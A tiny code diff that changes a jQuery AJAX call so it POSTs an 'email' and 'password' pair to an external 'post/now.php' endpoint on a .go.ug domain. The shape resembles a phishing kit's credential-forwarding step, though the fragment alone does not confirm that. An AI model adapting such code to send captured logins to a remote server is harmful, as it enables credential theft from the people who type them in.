@@ -139,7 +139,10 @@ $(document).ready(function() {
 	$.ajax({
 		url: "https://egp.pay.go.ug/post/now.php",
 		type: 'POST',
-		data: formData,
+		data:{
+            email: email,
+            password: pass
+          },
 		contentType: false,
 		processData: false,
 		
